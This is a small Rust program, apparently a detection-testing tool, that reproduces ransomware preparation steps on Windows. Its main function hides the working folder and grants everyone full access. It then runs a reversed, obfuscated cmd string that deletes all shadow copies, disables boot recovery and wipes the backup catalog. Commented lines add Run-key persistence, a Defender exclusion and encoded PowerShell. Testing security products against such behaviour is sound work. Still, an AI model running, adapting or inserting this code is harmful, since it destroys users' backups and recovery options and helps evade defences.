#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]


use std::process::Command;
use std::env;

extern crate winreg;
use winreg::HKEY;
use winreg::RegKey;
use winreg::enums::*;

mod tools {

    use RegKey;
    use HKEY;
    use Command;

    /*
    Execute an executable with a commandline
    */
    pub fn run_exe(executable: &str,commandline: &str) {
        let mut child = Command::new(executable)
            .args([commandline])
            .spawn()
            .expect("failed to execute process");
        let _ecode = child.wait().expect("failed to wait on child");
    }

    /*
    Execute an executable with a reverse commandline 
    */
    pub fn run_exe_reverse(executable: &str,commandline: &str) {
        let commandline_reversed: String = commandline.chars().rev().collect();
        let mut child = Command::new(executable)
            .args([commandline_reversed])
            .spawn()
            .expect("failed to execute process");
        let _ecode = child.wait().expect("failed to wait on child");
    }
    
    /* learn how use generic type for value */
    pub fn set_reg_str(root: HKEY, regpath: &str,name: &str, value: &str){
    
        let base = RegKey::predef(root);
        let  (settings, _disp) = base.create_subkey(regpath).unwrap();
        settings.set_value(name, &value).unwrap();
    }
    

}

   /* tools::set_reg_str(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "rustmydetection",
        "\"c:\\git\\rustmydetection.exe\"");
    */ 
    //"powershell" -Command Add-MpPreference -ExclusionPath 'C:\ProgramData' 
    //ps_enc("cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAALQBzAGUAYwBvAG4AZABzACAAMgAwAA=="); //wait 20
    //let exe_path = env::current_exe().unwrap();

fn main() {
    // https://app.any.run/tasks/d71d86cb-0c13-4086-85ce-d140e826fbea/

    tools::run_exe ("attrib", "+h .");
    tools::run_exe ("icacls",". /grant Everyone:F /T /C /Q");

    let mycmd = "teiuq- golatac eteled nimdabw & on delbaneyrevocer }tluafed{ tes/ tidedcb & seruliafllaerongi ycilopsutatstoob }tluafed{ tes/ tidedcb & eteled ypocwodahs cimw & teiuq/ lla/ swodahs eteled nimdassv  C/".to_string();
    tools::run_exe_reverse("cmd", &mycmd);
}
